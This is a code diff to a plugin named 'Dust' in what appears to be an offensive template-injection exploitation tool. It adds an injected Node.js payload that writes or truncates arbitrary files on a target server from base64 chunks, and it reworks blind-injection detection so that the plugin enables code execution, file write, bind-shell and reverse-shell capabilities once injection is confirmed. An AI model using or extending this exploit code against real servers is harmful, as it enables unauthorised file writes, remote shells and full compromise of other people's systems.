@@ -33,7 +33,12 @@ class Dust(Plugin):
         'reverse_shell' : {
             'call': 'execute_blind',
             'reverse_shell' : languages.bash_reverse_shell
-        }
+        },
+        'write' : {
+            'call' : 'evaluate',
+            'write' : """require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
+            'truncate' : """require('fs').writeFileSync('%(path)s', '')"""
+        },
     }
 
     contexts = [
@@ -114,14 +119,31 @@ class Dust(Plugin):
                     self.plugin)
                 )            
         
-                if self.execute_blind('echo %s' % str(rand.randint_n(2))):
-                    self.set('blind', True)
-                    self.set('execute_blind', True)
-                    self.set('write', True)
-                    self.set('bind_shell', True)
-                    self.set('reverse_shell', True)
+        # Blind inj must be checked also with confirmed rendering
+        self._detect_blind()
 
-                    log.info('%s plugin has confirmed blind injection' % (self.plugin))
+        if self.get('blind'):
+
+            log.info('%s plugin has confirmed blind injection' % (self.plugin))
+
+            # Clean up any previous unreliable render data
+            self.delete('unreliable_render')
+            self.delete('unreliable')
+
+            # Set the environment
+            self.blind_detected()
 
 
+    def blind_detected(self):
 
+        self.set('engine', self.plugin.lower())
+        self.set('language', self.language)
+
+        # Blind has been detected so code has been already evaluated
+        self.set('evaluate_blind', self.language)
+
+        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
+            self.set('execute_blind', True)
+            self.set('write', True)
+            self.set('bind_shell', True)
+            self.set('reverse_shell', True)
